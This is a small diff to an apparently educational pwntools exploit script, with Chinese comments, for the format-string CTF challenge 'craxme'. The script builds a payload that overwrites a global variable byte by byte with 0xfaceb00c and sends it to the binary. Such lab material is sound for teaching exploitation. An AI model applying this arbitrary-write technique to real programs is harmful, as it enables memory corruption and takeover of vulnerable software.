@@ -12,7 +12,7 @@ p = process("./craxme")
 p.recvuntil("Give me magic :")
 
 magic = 0x804a038
-targat = 0xfaceb00c
+write = 0xfaceb00c
 
 def fmt(prev, word, index):
     if prev < word:
@@ -28,14 +28,15 @@ def fmt(prev, word, index):
     return fmtstr
 
 payload = flat([magic, magic+1, magic+2, magic+3])
-prev = 4*4
-for i in range(4): # range 等於欲填入 byte 次數
-    payload += fmt(prev, (targat >> 8*i) & 0xff, 7+i) # 7 代表一開始寫入到 7$
-    prev = (targat >> 8*i) & 0xff
+prev = 4*4 # 前面已 padding 的 byte 數
+
+for i in range(4): # range 等於欲填入 address 次數
+    payload += fmt(prev, (write >> 8*i) & 0xff, 7+i) # 7 代表一開始寫入到 7$
+    prev = (write >> 8*i) & 0xff
 
 p.sendline(payload)
 p.interactive()
 
-    
+
 
 
